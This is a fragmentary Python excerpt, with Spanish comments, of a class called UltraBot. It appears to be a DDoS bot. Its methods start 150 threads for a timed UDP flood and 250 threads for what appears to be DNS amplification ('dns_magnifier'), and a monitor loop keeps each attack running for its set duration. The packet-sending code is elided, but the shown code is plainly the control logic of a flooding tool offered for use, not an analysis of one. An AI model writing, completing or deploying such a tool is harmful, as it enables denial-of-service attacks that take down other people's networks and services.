...
class UltraBot:
    ...
    def stop_all(self):
        ...
        # Esperar que todos los threads terminen (excepto el actual)
        current_thread = threading.current_thread()
        threads_to_join = []
        
        for t in self.attack_threads:
            if t != current_thread and t.is_alive():
    ...
    def udp_generic(self, target, port, duration):
        ...
        # Detener ataques previos (pero no intentar join con este thread)
        with self.lock:
            self.attack_active = False
            
        # Pequeña pausa para que los threads anteriores se detengan
        time.sleep(0.5)
        ...
        self.attack_threads = [current_thread]
        ...
        print(f"[🌀] PREPARANDO ATAQUE POR {duration}s")
        ...
        for i in range(150):  # 150 workers
            t = threading.Thread(target=worker, args=(i,))
            t.daemon = True
            t.start()
        ...
        print(f"[+] {len(worker_threads)} workers Generic iniciados")
        print(f"[🌀] INICIANDO ATAQUE UDP GENERIC POR {duration}s")
        
        # MONITOR PRINCIPAL - GARANTIZA DURACIÓN
        last_report = time.time()
        while time.time() < end_time and self.attack_active:
            current_time = time.time()
            remaining = end_time - current_time
        ...
        if time.time() < end_time:
            sleep_time = end_time - time.time()
            if sleep_time > 0:
                print(f"[🌀] Asegurando tiempo restante: {sleep_time:.3f}s")
                time.sleep(sleep_time)
        
        # Pequeña pausa para que workers terminen
        time.sleep(0.5)
        ...
        # Remover este thread de la lista
        with self.lock:
    ...
    def dns_magnifier(self, target, port, duration):
        ...
        for i in range(250):  # Más workers para DNS
            ...
            t.daemon = True
            t.start()
            dns_workers.append(t)
            self.attack_threads.append(t)
        
        print(f"[+] {len(dns_workers)} workers DNS iniciados")
